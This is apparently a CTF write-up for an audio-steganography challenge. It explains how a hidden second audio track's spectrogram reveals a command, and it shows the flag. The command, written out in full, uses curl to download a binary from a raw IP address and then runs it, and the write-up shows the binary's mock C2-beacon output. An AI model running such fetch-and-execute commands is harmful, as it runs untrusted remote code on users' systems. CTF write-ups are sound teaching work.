# Sorry, you're NOT a sigma!

The lion says solve this challenge. You seem to have a good **track** record at doing so.

**SHA256:** `66591540e5dd8e925128513d1ca0810118350c822429e4e8c1d1a98b7d8924f3`


## Solution

By loading the `.mp4` file into a program such as Audacity, you can see there are two audio tracks in the file, however, you only hear one when viewing the file using a media player. When choosing the second audio track, you can then view the spectrogram for the hidden distorted audio which visually contains the following command within the spectrogram:

```
curl -s http://23.179.17.40:6969/roar /tmp/roar && chmod +x /tmp/roar && /tmp/roar
```

The above command downloads a binary and then executes it on your system which should output something similar into your terminal over the span of around 10 seconds:

```
[*] Initializing beacon...
[*] Beacon attempt 1: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 2: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 3: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 4: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 5: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 6: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 7: phoning home...
[+] Beacon successfully reached C2 on attempt 7.
[*] Downloading payload...
[*] Decrypting response...
[+] Flag received:
CIT{wh3n_th3_l10n_sp34k5_y0u_l1st3n}
```

No, it is not actually a C2 beacon.

## Flag

> `CIT{wh3n_th3_l10n_sp34k5_y0u_l1st3n}`